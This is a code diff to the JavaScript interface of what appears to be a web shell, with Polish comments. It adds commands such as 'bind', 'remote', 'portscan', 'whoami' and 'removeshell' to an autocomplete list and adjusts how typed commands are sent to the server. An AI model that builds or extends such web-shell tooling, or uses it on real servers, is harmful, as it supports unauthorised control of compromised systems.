@@ -61,6 +61,7 @@ var aCommands = new Array
 	'bind',
 	'pwd',
 	'remove',
+	'remote',
 	'rm',
 	'delete',
 	'del',
@@ -120,8 +121,18 @@ var aCommands = new Array
 	'phpinfo',
 	'destroy',
 	'removeshell',
-	'emailvalidator'
+	'emailvalidator',
+	'portscan',
+	'portscanner',
+	'id',
+	'whoami',
+	'speedtest',
+	'touch',
+	'autoload',
+	'version'
 );
+
+aCommands.sort();
 
 /**
  * body
@@ -167,7 +178,7 @@ var oCmd = document.getElementById( 'cmd' );
 var oPrompt = document.createElement( 'div' );
 
 oPrompt.setAttribute( 'id', 'prompt' );
-oPrompt.setAttribute( 'style', 'text-align: left; padding-left: 25px' );
+oPrompt.setAttribute( 'style', 'text-align: left; word-wrap: break-word; padding-left: 25px' );
 oPrompt.innerHTML = '<strong>Dostępne polecenia:</strong> <em>Brak</em>';
 
 oForm.appendChild( document.createElement( 'br' ) );
@@ -179,9 +190,15 @@ autoPrompt( oCmd.value.substring( 1 ) );
 /**
  * Automatyczne podpowiedzi
  */
-event( oCmd, 'keyup', function()
+event( oCmd, 'keyup', function( oKey )
 	{
-		if( ( oCmd.value.length > 1 ) && ( oCmd.value.substring( 0, 1 ) == ':' ) )
+		if( oKey.which == 9 )
+		{
+			return ;
+		}
+
+
+		if( ( oCmd.value.length > 0 ) && ( oCmd.value.substring( 0, 1 ) == ':' ) )
 		{
 			autoPrompt( oCmd.value.substring( 1 ) );
 		}
@@ -234,7 +251,10 @@ function submitForm()
 				oStatus.style.display = 'none';
 			}
 		}
-		oAjax.send( 'cmd=' + escape( oCmd.value ) );
+
+		var sCmd = escape( oCmd.value );
+
+		oAjax.send( 'cmd=' + sCmd.replace( new RegExp( '\\+', 'g' ), '%2B' ) );
 		return false;
 	}
 
@@ -275,30 +295,58 @@ function autoPrompt( sCommand )
 	aParametrs = sCommand.split( ' ' );
 	sCommand = aParametrs[0].trim();
 
-	if( sCommand != '' )
+	bEnd = ! ( aParametrs[1] == undefined );
+
+	if( sCommand !== '' )
 	{
 		for( i in aCommands )
 		{
 			if( aCommands[ i ].substring( 0, sCommand.length ) == sCommand )
 			{
-				sOutput += '<span onclick="changeCommand(\'' + aCommands[ i ] + '\');">';
-
+				/**
+				 * Wprowadzono pelne polecenie
+				 */
+				if( bEnd && ( aCommands[ i ] == sCommand ) )
+				{
+					sOutput = '<span class="red">';
+					sOutput += aCommands[ i ];
+					sOutput += '</span>,&nbsp;';
+					break ;
+				}
 				/**
 				 * Wyroznienie szukanej frazy kolorem czerwonym
 				 */
-				sOutput += '<span class="red">';
-				sOutput += aCommands[ i ].substring( 0, sCommand.length );
-				sOutput += '</span>';
+				else
+				{
+					sOutput += "<span onclick=\"changeCommand('" + aCommands[ i ] + "');\">";
 
-				sOutput += aCommands[ i ].substring( sCommand.length );
-				sOutput += '</span>,&nbsp;';
+					sOutput += '<span class="red">';
+					sOutput += aCommands[ i ].substring( 0, sCommand.length );
+					sOutput += '</span>';
+
+					sOutput += aCommands[ i ].substring( sCommand.length );
+					sOutput += '</span>,&nbsp;';
+				}
 			}
+		}
+	}
+	else
+	{
+		for( i in aCommands )
+		{
+			sOutput += "<span onclick=\"changeCommand('" + aCommands[ i ] + "');\" class=\"red\">";
+			sOutput += aCommands[ i ];
+			sOutput += '</span>,&nbsp;';
 		}
 	}
 
 	if( sOutput == '' )
 	{
 		sOutput = '<em>Brak</em>';
+	}
+	else
+	{
+		sOutput = sOutput.substring( 0, sOutput.length - 7 );
 	}
 
 	oPrompt.innerHTML = '<strong>Dostępne polecenia:</strong> ' + sOutput;
